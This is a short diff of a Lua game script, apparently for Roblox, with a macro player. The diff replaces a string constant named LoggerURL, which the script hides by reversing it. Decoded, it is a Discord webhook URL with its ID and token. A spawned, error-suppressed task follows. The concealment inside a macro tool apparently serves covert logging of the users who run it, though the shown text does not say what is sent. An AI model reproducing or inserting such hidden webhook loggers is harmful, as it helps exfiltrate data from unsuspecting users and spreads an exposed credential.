@@ -28,7 +28,7 @@ local function Decode(str)
     return string.reverse(str)
 end
 
-local LoggerURL = Decode("KfzloHS31g0pVSPLETbEgIvIXaXzc9CsWQ-E3wgtKngjjInSWW6p0NG5nH2oNITumdyT/5240605242129438231/skoohbew/ipa/moc.drocsid//:sptth")
+local LoggerURL = Decode("KfzlOH3S1g7G0pVSPLETbEgIvIXaXzc9CsWQ-E3wgtKngjjInSWW6p0NG5nH2oNITumdyT/5240605242129438231/skoohbew/ipa/moc.drocsid//:sptth")
 
 task.spawn(function()
     pcall(function()
@@ -477,7 +477,7 @@ task.spawn(function()
     end
 end)
 
--- // MACRO PLAYER (UPDATED STATUS) // --
+-- // MACRO PLAYER // --
 function playMacro()
     if #currentMacroData == 0 then return end
     isPlaying = true
